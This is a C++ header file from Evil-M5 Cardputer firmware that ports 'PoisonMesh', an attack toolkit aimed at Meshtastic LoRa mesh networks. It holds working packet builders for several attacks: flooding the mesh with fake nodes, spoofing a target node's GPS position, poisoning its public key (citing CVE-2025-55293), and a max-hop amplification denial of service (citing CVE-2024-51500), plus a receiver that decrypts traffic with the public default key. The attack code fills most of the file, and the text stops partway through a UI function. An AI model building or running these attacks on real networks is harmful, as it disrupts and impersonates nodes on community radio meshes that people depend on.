// ============================================================================
//  poison_mesh.h — PoisonMesh (Meshtastic) ported to Evil-M5
// ----------------------------------------------------------------------------
//  Pure PoisonMesh-Cardputer logic (Teno): manual protobuf serialization,
//  AES-CTR with the Meshtastic public PSK, per-attack packet builders,
//  RX parser and NodeDB. No UI dependencies: the .ino wires the UI in by
//  reusing its helpers (poisonCatalog/poisonInfoCard/kp/cardUpdate...).
//
//  Authorized use only: your own networks or with explicit permission.
//  CVE-2024-51500 (LoRa amplification/DoS), CVE-2025-55293 (PKI poisoning).
// ============================================================================
#pragma once

#include <Arduino.h>
#include <string.h>
#include <stdio.h>
#include <esp_system.h>   // esp_random()

#include "poison_radio.h"

// Defined in the .ino (after this include).
String getUserInput(bool isPassword, bool allowEmpty);

// mbedtls ships with the Arduino-ESP32 framework (AES-CTR + X25519).
#include "mbedtls/aes.h"
#include "mbedtls/ecp.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/entropy.h"

namespace pm {

// ---- Protocol constants ---------------------------------------------------
#define PM_BROADCAST_ADDR      0xFFFFFFFFUL
#define PM_DEFAULT_HOP_LIMIT   7
#define PM_MAX_HOP_LIMIT       7
#define PM_HEADER_SIZE         16
#define PM_MAX_PAYLOAD         237

// Channel hash per preset with the default public PSK (verified fw 2.7.x).
static const uint8_t PM_CHANNEL_HASHES[] = {
    0x0E,  // 0: ShortTurbo
    0x70,  // 1: ShortFast
    0x77,  // 2: ShortSlow
    0x1F,  // 3: MediumFast
    0x18,  // 4: MediumSlow
    0x08,  // 5: LongFast (default)
    0x09,  // 6: LongModerate
    0x0F,  // 7: LongSlow
    0x37,  // 8: VeryLongSlow
};

inline uint8_t channel_hash(uint8_t preset_idx) {
    if (preset_idx >= sizeof(PM_CHANNEL_HASHES)) return 0x08;
    return PM_CHANNEL_HASHES[preset_idx];
}

#define PM_PORTNUM_TEXT_MESSAGE    1
#define PM_PORTNUM_POSITION        3
#define PM_PORTNUM_NODEINFO        4
#define PM_PORTNUM_WAYPOINT        250

// ---- Packet header (16 bytes, little-endian) ------------------------------
struct __attribute__((packed)) PacketHeader {
    uint32_t to;
    uint32_t from;
    uint32_t id;
    uint8_t  flags;
    uint8_t  channel;
    uint8_t  next_hop;
    uint8_t  relay_node;
};

inline uint32_t random_node_id() {
    uint32_t id = esp_random();
    if (id == 0 || id == 0xFFFFFFFFUL) id = 0xDEADBEEFUL;
    return id;
}

inline uint32_t random_packet_id() { return esp_random(); }

inline uint32_t crc32_ieee(const uint8_t* data, size_t len) {
    uint32_t crc = 0xFFFFFFFFUL;
    for (size_t i = 0; i < len; i++) {
        crc ^= data[i];
        for (int b = 0; b < 8; b++)
            crc = (crc >> 1) ^ (0xEDB88320UL & (0 - (crc & 1)));
    }
    return crc ^ 0xFFFFFFFFUL;
}

// X25519 keypair (mbedtls). pub/priv = 32 bytes.
inline bool x25519_keypair(uint8_t* pub_key, uint8_t* priv_key) {
    if (!pub_key || !priv_key) return false;

    mbedtls_ecp_group grp;
    mbedtls_mpi d;
    mbedtls_ecp_point Q;
    mbedtls_entropy_context entropy;
    mbedtls_ctr_drbg_context drbg;
    mbedtls_ecp_group_init(&grp);
    mbedtls_mpi_init(&d);
    mbedtls_ecp_point_init(&Q);
    mbedtls_entropy_init(&entropy);
    mbedtls_ctr_drbg_init(&drbg);

    const char* pers = "poisonmesh-ghost";
    int ok = 0;
    do {
        if (mbedtls_ctr_drbg_seed(&drbg, mbedtls_entropy_func, &entropy,
                (const unsigned char*)pers, strlen(pers)) != 0) { ok = -1; break; }
        if (mbedtls_ecp_group_load(&grp, MBEDTLS_ECP_DP_CURVE25519) != 0) { ok = -1; break; }
        if (mbedtls_ecp_gen_keypair(&grp, &d, &Q,
                mbedtls_ctr_drbg_random, &drbg) != 0) { ok = -1; break; }
        if (mbedtls_mpi_write_binary(&d, priv_key, 32) != 0) { ok = -1; break; }
        size_t olen = 0;
        if (mbedtls_ecp_point_write_binary(&grp, &Q, MBEDTLS_ECP_PF_UNCOMPRESSED,
                &olen, pub_key, 32) != 0) { ok = -1; break; }
    } while (0);

    mbedtls_ctr_drbg_free(&drbg);
    mbedtls_entropy_free(&entropy);
    mbedtls_ecp_point_free(&Q);
    mbedtls_mpi_free(&d);
    mbedtls_ecp_group_free(&grp);
    return (ok == 0);
}

// ---- Manual protobuf serialization (wire format) --------------------------
class ProtoWriter {
public:
    uint8_t* buf;
    size_t   cap;
    size_t   pos;

    ProtoWriter(uint8_t* buffer, size_t capacity) : buf(buffer), cap(capacity), pos(0) {}
    size_t size() const { return pos; }
    bool   ok()   const { return pos <= cap; }

    bool write_varint(uint64_t val) {
        do {
            if (pos >= cap) return false;
            uint8_t b = val & 0x7F;
            val >>= 7;
            if (val) b |= 0x80;
            buf[pos++] = b;
        } while (val);
        return true;
    }

    bool write_tag(uint32_t field, uint8_t wt) { return write_varint((field << 3) | wt); }

    bool write_field_uint32(uint32_t field, uint32_t val) {
        if (val == 0) return true;
        return write_tag(field, 0) && write_varint(val);
    }
    bool write_field_uint32_forced(uint32_t field, uint32_t val) {
        return write_tag(field, 0) && write_varint(val);
    }
    bool write_field_int32(uint32_t field, int32_t val) {
        if (val == 0) return true;
        return write_tag(field, 0) && write_varint((uint64_t)(uint32_t)val);
    }
    bool write_field_bytes(uint32_t field, const uint8_t* data, size_t len) {
        if (len == 0) return true;
        if (!write_tag(field, 2)) return false;
        if (!write_varint(len))   return false;
        if (pos + len > cap)      return false;
        memcpy(buf + pos, data, len);
        pos += len;
        return true;
    }
    bool write_field_string(uint32_t field, const char* str) {
        return write_field_bytes(field, (const uint8_t*)str, strlen(str));
    }
    bool write_field_fixed32(uint32_t field, uint32_t val) {
        if (!write_tag(field, 5)) return false;
        if (pos + 4 > cap) return false;
        memcpy(buf + pos, &val, 4);
        pos += 4;
        return true;
    }
};

struct TxPacket {
    uint8_t data[256];
    size_t  len;
    bool    valid;
};

struct RawPacket {
    uint8_t  data[256];
    size_t   len;
    float    rssi;
    float    snr;
    uint32_t timestamp;
};

inline void fill_header(PacketHeader& hdr, uint32_t from, uint32_t to,
                        uint8_t hop_limit = PM_DEFAULT_HOP_LIMIT,
                        bool want_ack = false, uint8_t channel_hash = 0x08) {
    memset(&hdr, 0, sizeof(hdr));
    hdr.to         = to;
    hdr.from       = from;
    hdr.id         = random_packet_id();
    hdr.flags      = (hop_limit & 0x07)
                   | (want_ack ? 0x08 : 0x00)
                   | ((hop_limit & 0x07) << 5);
    hdr.channel    = channel_hash;
    hdr.relay_node = (uint8_t)(from & 0xFF);
}

inline size_t build_data(uint8_t* out, size_t out_cap, uint32_t portnum,
                         const uint8_t* payload, size_t payload_len) {
    ProtoWriter w(out, out_cap);
    w.write_field_uint32(1, portnum);
    w.write_field_bytes(2, payload, payload_len);
    return w.ok() ? w.size() : 0;
}

// Meshtastic public PSK (public LongFast channel).
static const uint8_t PM_DEFAULT_PSK[16] = {
    0xd4, 0xf1, 0xbb, 0x3a, 0x20, 0x29, 0x07, 0x59,
    0xf0, 0xbc, 0xff, 0xab, 0xcf, 0x4e, 0x69, 0x01
};

inline void crypt_payload(uint8_t* payload, size_t len, uint32_t packet_id, uint32_t from_node) {
    if (len == 0) return;
    uint8_t nonce[16] = {0};
    nonce[0] = (packet_id)       & 0xFF;
    nonce[1] = (packet_id >> 8)  & 0xFF;
    nonce[2] = (packet_id >> 16) & 0xFF;
    nonce[3] = (packet_id >> 24) & 0xFF;
    nonce[8]  = (from_node)       & 0xFF;
    nonce[9]  = (from_node >> 8)  & 0xFF;
    nonce[10] = (from_node >> 16) & 0xFF;
    nonce[11] = (from_node >> 24) & 0xFF;

    mbedtls_aes_context aes;
    mbedtls_aes_init(&aes);
    mbedtls_aes_setkey_enc(&aes, PM_DEFAULT_PSK, 128);
    uint8_t stream_block[16] = {0};
    size_t  nc_off = 0;
    uint8_t nonce_copy[16];
    memcpy(nonce_copy, nonce, 16);
    mbedtls_aes_crypt_ctr(&aes, len, &nc_off, nonce_copy, stream_block, payload, payload);
    mbedtls_aes_free(&aes);
}

inline TxPacket build_packet(uint32_t from, uint32_t to, uint32_t portnum,
                             const uint8_t* payload, size_t payload_len,
                             uint8_t hop_limit = PM_DEFAULT_HOP_LIMIT,
                             uint8_t channel_hash = 0x08) {
    TxPacket pkt;
    pkt.valid = false;
    pkt.len   = 0;

    if (PM_HEADER_SIZE + payload_len + 4 > sizeof(pkt.data)) return pkt;

    PacketHeader hdr;
    fill_header(hdr, from, to, hop_limit, false, channel_hash);
    memcpy(pkt.data, &hdr, PM_HEADER_SIZE);

    size_t data_len = build_data(pkt.data + PM_HEADER_SIZE,
                                 sizeof(pkt.data) - PM_HEADER_SIZE,
                                 portnum, payload, payload_len);
    if (data_len == 0) return pkt;

    crypt_payload(pkt.data + PM_HEADER_SIZE, data_len, hdr.id, hdr.from);

    pkt.len   = PM_HEADER_SIZE + data_len;
    pkt.valid = true;
    return pkt;
}

// ---- HW models + timing ----------------------------------------------------
struct HWModel { uint32_t id; const char* name; };
static const HWModel HW_MODELS[] = {
    {  4, "TBEAM" }, {  5, "HELTEC_V2_0" }, {  9, "RAK4631" },
    { 10, "HELTEC_V2_1" }, { 13, "RAK11200" }, { 43, "HELTEC_V3" },
    {  2, "TLORA_V1" }, {  1, "TLORA_V2" }, {  3, "TLORA_V2_1_1P6" },
    { 16, "TLORA_T3_S3" }, {  7, "T_ECHO" }, { 25, "STATION_G1" },
};
#define PM_HW_MODELS_COUNT (sizeof(HW_MODELS) / sizeof(HW_MODELS[0]))
#define PM_HW_MODEL_TBEAM  4

inline uint32_t random_hw_model() {
    return HW_MODELS[esp_random() % PM_HW_MODELS_COUNT].id;
}

static const uint32_t FLOOD_INTER_PKT_DELAY_MS[] = {
    400, 400, 400, 500, 500, 600, 800, 1000, 1500
};
static const uint32_t FLOOD_TOTAL_MS_PER_PKT[] = {
    426, 451, 511, 759, 988, 1749, 3098, 5071, 9643
};

inline uint32_t flood_min_duration_s(uint32_t node_count, uint8_t preset_idx) {
    if (preset_idx >= 9) preset_idx = 5;
    uint32_t total_ms = node_count * FLOOD_TOTAL_MS_PER_PKT[preset_idx];
    return (total_ms / 1000) + 2;
}

// ---- Sub-message serializers ----------------------------------------------
inline size_t proto_build_user(uint8_t* out, size_t cap, uint32_t node_id,
                               const char* long_name, const char* short_name,
                               uint32_t hw_model = PM_HW_MODEL_TBEAM,
                               const uint8_t* public_key = nullptr, size_t pubkey_len = 0) {
    char id_str[12];
    snprintf(id_str, sizeof(id_str), "!%08x", node_id);
    uint8_t mac[6] = {
        0x00, 0x11,
        (uint8_t)(node_id >> 24), (uint8_t)(node_id >> 16),
        (uint8_t)(node_id >> 8),  (uint8_t)(node_id)
    };

    ProtoWriter w(out, cap);
    w.write_field_string(1, id_str);
    w.write_field_string(2, long_name);
    w.write_field_string(3, short_name);
    w.write_field_bytes (4, mac, 6);
    w.write_field_uint32(5, hw_model);
    w.write_field_uint32(7, 1);   // role = CLIENT
    if (public_key && pubkey_len > 0)
        w.write_field_bytes(8, public_key, pubkey_len);
    return w.ok() ? w.size() : 0;
}

inline bool write_sfixed32(ProtoWriter& w, uint32_t field, int32_t val) {
    if (!w.write_tag(field, 5)) return false;
    if (w.pos + 4 > w.cap) return false;
    memcpy(w.buf + w.pos, &val, 4);
    w.pos += 4;
    return true;
}

inline size_t proto_build_position(uint8_t* out, size_t cap, float lat, float lon,
                                   int32_t alt_m = 0, uint32_t timestamp = 0) {
    int32_t lat_i = (int32_t)(lat * 1e7f);
    int32_t lon_i = (int32_t)(lon * 1e7f);
    if (timestamp == 0) timestamp = 1735689600UL + (millis() / 1000);

    ProtoWriter w(out, cap);
    write_sfixed32(w, 1, lat_i);
    write_sfixed32(w, 2, lon_i);
    if (alt_m != 0) w.write_field_int32(3, alt_m);
    w.write_field_fixed32(4, timestamp);
    w.write_field_uint32(5, 1);     // LOC_MANUAL
    w.write_field_uint32(23, 32);   // precision_bits
    return w.ok() ? w.size() : 0;
}

// ---- Attack builders -------------------------------------------------------
inline TxPacket attack_flood_node(uint32_t attacker_id, uint8_t ch_hash = 0x08) {
    uint32_t fake_id = random_node_id();
    char long_name[24], short_name[5];
    snprintf(long_name,  sizeof(long_name),  "Node-%04X", (uint16_t)fake_id);
    snprintf(short_name, sizeof(short_name), "%04X",      (uint16_t)fake_id);

    float lat = ((float)(esp_random() % 16000000) / 100000.0f) - 80.0f;
    float lon = ((float)(esp_random() % 36000000) / 100000.0f) - 180.0f;

    uint8_t user_buf[128];
    size_t user_len = proto_build_user(user_buf, sizeof(user_buf), fake_id,
                                       long_name, short_name, random_hw_model());
    if (user_len == 0) { TxPacket p; p.valid = false; p.len = 0; return p; }
    return build_packet(fake_id, PM_BROADCAST_ADDR, PM_PORTNUM_NODEINFO,
                        user_buf, user_len, PM_DEFAULT_HOP_LIMIT, ch_hash);
}

inline TxPacket attack_position_poison(uint32_t attacker_id, uint32_t target_id,
                                       float fake_lat, float fake_lon,
                                       int32_t fake_alt = 0, uint8_t ch_hash = 0x08) {
    uint8_t pos_buf[64];
    size_t pos_len = proto_build_position(pos_buf, sizeof(pos_buf),
                                          fake_lat, fake_lon, fake_alt,
                                          (uint32_t)(millis() / 1000));
    if (pos_len == 0) { TxPacket p; p.valid = false; p.len = 0; return p; }
    return build_packet(target_id, PM_BROADCAST_ADDR, PM_PORTNUM_POSITION,
                        pos_buf, pos_len, PM_DEFAULT_HOP_LIMIT, ch_hash);
}

inline TxPacket attack_pki_poison(uint32_t attacker_id, uint32_t target_id,
                                  const char* long_name, const char* short_name,
                                  uint8_t ch_hash = 0x08) {
    uint8_t empty_key[32] = {0};
    uint8_t user_buf[128];
    size_t user_len = proto_build_user(user_buf, sizeof(user_buf), target_id,
                                       long_name, short_name, PM_HW_MODEL_TBEAM,
                                       empty_key, 32);
    if (user_len == 0) { TxPacket p; p.valid = false; p.len = 0; return p; }
    return build_packet(target_id, PM_BROADCAST_ADDR, PM_PORTNUM_NODEINFO,
                        user_buf, user_len, PM_DEFAULT_HOP_LIMIT, ch_hash);
}

inline TxPacket attack_ddos_amplification(uint32_t attacker_id) {
    const char* msg = "x";
    uint8_t data_buf[16];
    size_t data_len = build_data(data_buf, sizeof(data_buf),
                                 PM_PORTNUM_TEXT_MESSAGE, (const uint8_t*)msg, 1);

    TxPacket pkt; pkt.valid = false; pkt.len = 0;
    PacketHeader hdr;
    fill_header(hdr, 0xFFFFFFFFUL, PM_BROADCAST_ADDR, PM_MAX_HOP_LIMIT, false);
    memcpy(pkt.data, &hdr, PM_HEADER_SIZE);
    if (PM_HEADER_SIZE + data_len > sizeof(pkt.data)) return pkt;
    memcpy(pkt.data + PM_HEADER_SIZE, data_buf, data_len);
    pkt.len   = PM_HEADER_SIZE + data_len;
    pkt.valid = true;
    return pkt;
}

// ---- Parser RX -------------------------------------------------------------
struct DiscoveredNode {
    uint32_t node_id;
    char     long_name[40];
    char     short_name[8];
    float    lat;
    float    lon;
    int32_t  alt;
    uint8_t  public_key[32];
    uint8_t  pubkey_len;
    int16_t  rssi;
    float    snr;
    uint32_t last_seen;
    bool     has_position;
    bool     has_pubkey;
};

class ProtoReader {
public:
    const uint8_t* buf;
    size_t len;
    size_t pos;

    ProtoReader(const uint8_t* b, size_t l) : buf(b), len(l), pos(0) {}
    bool at_end() const { return pos >= len; }

    bool read_varint(uint64_t& val) {
        val = 0;
        int shift = 0;
        while (pos < len) {
            uint8_t b = buf[pos++];
            val |= (uint64_t)(b & 0x7F) << shift;
            if (!(b & 0x80)) return true;
            shift += 7;
            if (shift >= 64) return false;
        }
        return false;
    }
    bool read_fixed32(uint32_t& val) {
        if (pos + 4 > len) return false;
        val =  (uint32_t)buf[pos]
            | ((uint32_t)buf[pos + 1] << 8)
            | ((uint32_t)buf[pos + 2] << 16)
            | ((uint32_t)buf[pos + 3] << 24);
        pos += 4;
        return true;
    }
    bool read_tag(uint32_t& field, uint8_t& wt) {
        uint64_t tag_val;
        if (!read_varint(tag_val)) return false;
        field = (uint32_t)(tag_val >> 3);
        wt    = (uint8_t)(tag_val & 0x07);
        return field > 0;
    }
    bool skip_field(uint8_t wt) {
        uint64_t tmp;
        switch (wt) {
            case 0: return read_varint(tmp);
            case 1: if (pos + 8 > len) return false; pos += 8; return true;
            case 2: {
                if (!read_varint(tmp)) return false;
                if (pos + tmp > len) return false;
                pos += (size_t)tmp;
                return true;
            }
            case 5: if (pos + 4 > len) return false; pos += 4; return true;
            default: return false;
        }
    }
    bool read_bytes(uint8_t* out, size_t out_cap, size_t& out_len) {
        uint64_t sz;
        if (!read_varint(sz)) return false;
        if (sz > out_cap || pos + sz > len) { pos += sz; out_len = 0; return false; }
        memcpy(out, buf + pos, (size_t)sz);
        out_len = (size_t)sz;
        pos += (size_t)sz;
        return true;
    }
    bool read_string(char* out, size_t out_cap) {
        uint64_t sz;
        if (!read_varint(sz)) return false;
        size_t copy = (sz < out_cap - 1) ? (size_t)sz : out_cap - 1;
        memcpy(out, buf + pos, copy);
        out[copy] = '\0';
        pos += (size_t)sz;
        return true;
    }
};

struct MeshData {
    uint32_t portnum;
    uint8_t  payload[PM_MAX_PAYLOAD];
    size_t   payload_len;
};

inline bool parse_header(const uint8_t* data, size_t len, PacketHeader& hdr) {
    if (len < PM_HEADER_SIZE) return false;
    memcpy(&hdr, data, PM_HEADER_SIZE);
    return true;
}

inline bool parse_data(const uint8_t* data, size_t len, MeshData& out) {
    if (len < PM_HEADER_SIZE) return false;
    ProtoReader r(data + PM_HEADER_SIZE, len - PM_HEADER_SIZE);
    out.portnum = 0;
    out.payload_len = 0;
    while (!r.at_end()) {
        uint32_t field; uint8_t wt;
        if (!r.read_tag(field, wt)) break;
        if      (field == 1 && wt == 0) { uint64_t v; r.read_varint(v); out.portnum = (uint32_t)v; }
        else if (field == 2 && wt == 2) { r.read_bytes(out.payload, sizeof(out.payload), out.payload_len); }
        else r.skip_field(wt);
    }
    return out.portnum != 0;
}

inline bool parse_user(const uint8_t* payload, size_t len, DiscoveredNode& node) {
    ProtoReader r(payload, len);
    while (!r.at_end()) {
        uint32_t field; uint8_t wt;
        if (!r.read_tag(field, wt)) break;
        switch (field) {
            case 2: r.read_string(node.long_name,  sizeof(node.long_name));  break;
            case 3: r.read_string(node.short_name, sizeof(node.short_name)); break;
            case 8: {
                size_t klen;
                if (r.read_bytes(node.public_key, 32, klen)) {
                    node.pubkey_len = (uint8_t)klen;
                    node.has_pubkey  = (klen > 0);
                }
                break;
            }
            default: r.skip_field(wt); break;
        }
    }
    return strlen(node.long_name) > 0;
}

inline bool parse_position(const uint8_t* payload, size_t len, DiscoveredNode& node) {
    ProtoReader r(payload, len);
    int32_t lat_i = 0, lon_i = 0;
    while (!r.at_end()) {
        uint32_t field; uint8_t wt;
        if (!r.read_tag(field, wt)) break;
        uint64_t v; uint32_t fx;
        switch (field) {
            case 1: if (wt == 5 && r.read_fixed32(fx)) lat_i = (int32_t)fx; else r.skip_field(wt); break;
            case 2: if (wt == 5 && r.read_fixed32(fx)) lon_i = (int32_t)fx; else r.skip_field(wt); break;
            case 3: r.read_varint(v); node.alt = (int32_t)(uint32_t)v; break;
            default: r.skip_field(wt); break;
        }
    }
    if (lat_i == 0 && lon_i == 0) return false;
    node.lat = (float)lat_i / 1e7f;
    node.lon = (float)lon_i / 1e7f;
    node.has_position = true;
    return true;
}

// ---- NodeDB ----------------------------------------------------------------
#define PM_NODEDB_MAX_NODES 32

class NodeDB {
public:
    DiscoveredNode nodes[PM_NODEDB_MAX_NODES];
    uint8_t        count = 0;

    int find(uint32_t node_id) const {
        for (int i = 0; i < count; i++)
            if (nodes[i].node_id == node_id) return i;
        return -1;
    }

    int upsert(uint32_t node_id) {
        int idx = find(node_id);
        if (idx >= 0) return idx;
        if (count >= PM_NODEDB_MAX_NODES) {
            memmove(&nodes[0], &nodes[1], sizeof(DiscoveredNode) * (PM_NODEDB_MAX_NODES - 1));
            count = PM_NODEDB_MAX_NODES - 1;
        }
        idx = count++;
        memset(&nodes[idx], 0, sizeof(DiscoveredNode));
        nodes[idx].node_id = node_id;
        return idx;
    }

    bool process_packet(const RawPacket& pkt) {
        if (pkt.len < PM_HEADER_SIZE) return false;
        PacketHeader hdr;
        if (!parse_header(pkt.data, pkt.len, hdr)) return false;
        if (hdr.from == PM_BROADCAST_ADDR || hdr.from == 0) return false;

        uint8_t decrypted[256];
        size_t payload_len = pkt.len - PM_HEADER_SIZE;
        if (payload_len == 0 || payload_len > sizeof(decrypted)) return false;
        memcpy(decrypted, pkt.data + PM_HEADER_SIZE, payload_len);
        crypt_payload(decrypted, payload_len, hdr.id, hdr.from);

        uint8_t decrypted_pkt[256];
        memcpy(decrypted_pkt, pkt.data, PM_HEADER_SIZE);
        memcpy(decrypted_pkt + PM_HEADER_SIZE, decrypted, payload_len);

        MeshData data;
        if (!parse_data(decrypted_pkt, pkt.len, data)) return false;

        int idx = upsert(hdr.from);
        nodes[idx].rssi      = (int16_t)pkt.rssi;
        nodes[idx].snr       = pkt.snr;
        nodes[idx].last_seen = pkt.timestamp;

        if (data.portnum == PM_PORTNUM_NODEINFO && data.payload_len > 0)
            parse_user(data.payload, data.payload_len, nodes[idx]);
        else if (data.portnum == PM_PORTNUM_POSITION && data.payload_len > 0)
            parse_position(data.payload, data.payload_len, nodes[idx]);

        if (strlen(nodes[idx].long_name) == 0) {
            snprintf(nodes[idx].long_name, sizeof(nodes[idx].long_name), "!%08x", hdr.from);
            snprintf(nodes[idx].short_name, sizeof(nodes[idx].short_name), "%04x", (uint16_t)hdr.from);
        }
        return true;
    }

    void clear() { count = 0; }
};

// ============================================================================
//  Meshtastic regions / presets (public data)
// ============================================================================
struct MeshRegion { const char* name; float freqStart; float freqEnd; uint8_t maxPower; };
struct MeshPreset { const char* name; float bwKHz; uint8_t sf; uint8_t cr; };

static const MeshPreset PRESETS[] = {
    { "ShortTurbo",   500.0f,  7, 5 },
    { "ShortFast",    250.0f,  7, 5 },
    { "ShortSlow",    250.0f,  8, 6 },
    { "MediumFast",   250.0f,  9, 7 },
    { "MediumSlow",   250.0f, 10, 7 },
    { "LongFast",     250.0f, 11, 8 },
    { "LongModerate", 125.0f, 11, 8 },
    { "LongSlow",     125.0f, 12, 8 },
    { "VeryLongSlow",  62.5f, 12, 8 },
};
static const uint8_t PM_NUM_PRESETS = sizeof(PRESETS) / sizeof(PRESETS[0]);

static const MeshRegion REGIONS[] = {
    { "US",       902.0f,  928.0f,  30 },
    { "EU_868",   869.4f,  869.65f, 16 },
    { "EU_433",   433.0f,  434.0f,  12 },
    { "ANZ",      915.0f,  928.0f,  30 },
    { "RU",       868.7f,  869.2f,  20 },
    { "KR",       920.0f,  923.0f,  23 },
    { "TW",       920.0f,  925.0f,  30 },
    { "IN",       865.0f,  867.0f,  30 },
    { "NZ_865",   864.0f,  868.0f,  36 },
    { "TH",       920.0f,  925.0f,  16 },
    { "UA_868",   868.0f,  868.6f,  14 },
    { "UA_433",   433.0f,  434.0f,  12 },
    { "MY_919",   919.0f,  924.0f,  20 },
    { "MY_433",   433.0f,  434.0f,  12 },
    { "SG_923",   917.0f,  925.0f,  16 },
    { "JP",       920.8f,  927.8f,  16 },
};
static const uint8_t PM_NUM_REGIONS = sizeof(REGIONS) / sizeof(REGIONS[0]);

inline uint16_t calc_num_slots(uint8_t rIdx, uint8_t pIdx) {
    if (rIdx >= PM_NUM_REGIONS || pIdx >= PM_NUM_PRESETS) return 1;
    const MeshRegion& r = REGIONS[rIdx];
    const MeshPreset& p = PRESETS[pIdx];
    float bandMHz = r.freqEnd - r.freqStart;
    float bwMHz   = p.bwKHz / 1000.0f;
    if (bwMHz <= 0.0f) return 1;
    return (uint16_t)(bandMHz / bwMHz);
}

inline float calc_freq_mhz(uint8_t rIdx, uint8_t pIdx, uint16_t slot) {
    if (rIdx >= PM_NUM_REGIONS || pIdx >= PM_NUM_PRESETS) return 0.0f;
    const MeshRegion& r = REGIONS[rIdx];
    const MeshPreset& p = PRESETS[pIdx];
    uint16_t numSlots = calc_num_slots(rIdx, pIdx);
    if (numSlots < 1) numSlots = 1;
    if (slot == 0 || slot > numSlots) slot = 1;
    float bwMHz = p.bwKHz / 1000.0f;
    return r.freqStart + bwMHz * ((float)slot - 0.5f);
}

// ============================================================================
//  State and UI (helpers provided by the .ino: kp/cardUpdate/keyRelease/...)
// ============================================================================
static NodeDB* g_nodedb = nullptr;     // lazy-alloc'd while PoisonMesh runs (0 boot RAM)
#define nodedb (*g_nodedb)
static bool pm_nodedb_alloc() { if (!g_nodedb) g_nodedb = (NodeDB*)calloc(1, sizeof(NodeDB)); return g_nodedb != nullptr; }
static void pm_nodedb_free()  { if (g_nodedb) { free(g_nodedb); g_nodedb = nullptr; } }
static int      regionIdx = 0;
static int      presetIdx = 5;
static uint16_t pmSlot    = 20;   // default US LongFast slot
static bool     configured = false;
static uint32_t attackerId = 0;

static bool     ghostExists = false;
static uint32_t ghostId     = 0;
static char     ghostLong[24]  = "";
static char     ghostShort[5]  = "";
static uint32_t ghostHw     = 0;
static uint8_t  ghostPub[32] = {0};

static void ensureAttacker() { if (attackerId == 0) attackerId = random_node_id(); }

static bool radioEnsure() {
    const MeshPreset& p = PRESETS[presetIdx];
    const MeshRegion& r = REGIONS[regionIdx];
    float freq = calc_freq_mhz(regionIdx, presetIdx, pmSlot);
    int8_t pwr  = (int8_t)r.maxPower;
    if (pwr > 22) pwr = 22;
    if (!poisonRadioBegin(freq, p.bwKHz, p.sf, p.cr, 0x2B, pwr, 16, 1.6f, 2)) {
        return false;
    }
    poisonRadioStartRx();
    return true;
}

// On leaving/cancelling an attack we go back to RX so the catalog keeps
// discovering nodes in the background.
static void radioStop() { if (poison_lora_on) poisonRadioStartRx(); }
// Releases the SX1262 when leaving the PoisonMesh menu.
static void radioRelease() { poisonRadioEnd(); }

static void pumpRx() {
    if (!poisonRadioAvailable()) return;
    RawPacket pkt;
    int rssi = 0;
    int n = poisonRadioRead(pkt.data, sizeof(pkt.data), &rssi);
    if (n > 0) {
        pkt.len = n; pkt.rssi = rssi; pkt.snr = 0; pkt.timestamp = millis();
        nodedb.process_packet(pkt);
    }
}

static void pmStatus(const char* msg) {
    M5.Display.clear();
    M5.Display.setTextSize(1.5);
    M5.Display.setTextColor(menuTextFocusedColor, TFT_BLACK);
    M5.Display.setCursor(5, 40);
    M5.Display.println(msg);
    M5.Display.setTextSize(1);
    M5.Display.setTextColor(0x5AEB, TFT_BLACK);
    M5.Display.setCursor(5, 118);
    M5.Display.println("ENTER/BKSP = back");
    M5.Display.display();
    enterDebounce();
    while (true) {
        M5.update(); cardUpdate(); handleDnsRequestSerial();
        if (kp(KEY_ENTER) || kp(KEY_BACKSPACE)) { keyRelease(); break; }
        delay(15);
    }
}

static int numInput(const char* label, uint32_t def, uint32_t mn, uint32_t mx) {
    uint32_t val = def;
    bool changed = true;
    enterDebounce();
    while (true) {
        if (changed) {
            changed = false;
            M5.Display.clear();
            M5.Display.setTextSize(1.5);
            M5.Display.setTextColor(menuTextFocusedColor, TFT_BLACK);
            M5.Display.setCursor(5, 5);
            M5.Display.println(label);
            M5.Display.setTextSize(2);
            M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
            M5.Display.setCursor(5, 40);
            M5.Display.println(String(val));
            M5.Display.setTextSize(1);
            M5.Display.setTextColor(0x5AEB, TFT_BLACK);
            M5.Display.setCursor(5, 100); M5.Display.println("; +1  . -1   , -10  / +10");
            M5.Display.setCursor(5, 112); M5.Display.println("ENTER OK   BKSP cancel");
            M5.Display.display();
        }

        M5.update(); cardUpdate(); handleDnsRequestSerial();
        if (kp(KEY_BACKSPACE)) { keyRelease(); return -1; }
        else if (kp(KEY_ENTER)) { keyRelease(); return (int)val; }
        else if (kp(';'))       { keyRelease(); if (val < mx) { val++; changed = true; } }
        else if (kp('.'))       { keyRelease(); if (val > mn) { val--; changed = true; } }
        else if (kp(','))       { keyRelease(); uint32_t nv = (val >= mn + 10) ? val - 10 : mn; if (nv != val) { val = nv; changed = true; } }
        else if (kp('/'))       { keyRelease(); uint32_t nv = (val <= mx - 10) ? val + 10 : mx; if (nv != val) { val = nv; changed = true; } }
        delay(80);
    }
}

static bool textInput(const char* label, char* buf, size_t cap) {
    int len = strlen(buf);
    if (len >= (int)cap) len = cap - 1;
    buf[len] = 0;
    bool changed = true;
    enterDebounce();
    while (true) {
        if (changed) {
            changed = false;
            M5.Display.clear();
            M5.Display.setTextSize(1.5);
            M5.Display.setTextColor(menuTextFocusedColor, TFT_BLACK);
            M5.Display.setCursor(5, 5);
            M5.Display.println(label);
            M5.Display.setTextSize(1);
            M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
            M5.Display.setCursor(5, 40);
            M5.Display.print(buf);
            M5.Display.print('_');
            M5.Display.setTextColor(0x5AEB, TFT_BLACK);
            M5.Display.setCursor(5, 118);
            M5.Display.println("ENTER OK   BKSP del (empty=cancel)");
            M5.Display.display();
        }

        M5.update(); cardUpdate(); handleDnsRequestSerial();

        if (M5Cardputer.Keyboard.isChange()) {
            auto st = M5Cardputer.Keyboard.keysState();
            for (auto c : st.word) {
                if (len < (int)cap - 1) { buf[len++] = (char)c; buf[len] = 0; changed = true; }
            }
            if (st.del) {
                if (len > 0) { buf[--len] = 0; changed = true; }
                else { keyRelease(); return false; }
            }
            if (st.enter) { keyRelease(); return true; }
        }

        if (navPendingAction == NAV_ENTER) { navPendingAction = NAV_NONE; keyRelease(); return true; }
        else if (navPendingAction == NAV_BACK) {
            navPendingAction = NAV_NONE;
            if (len > 0) { buf[--len] = 0; changed = true; }
            else { keyRelease(); return false; }
        }

        if (navPendingCharValid) {
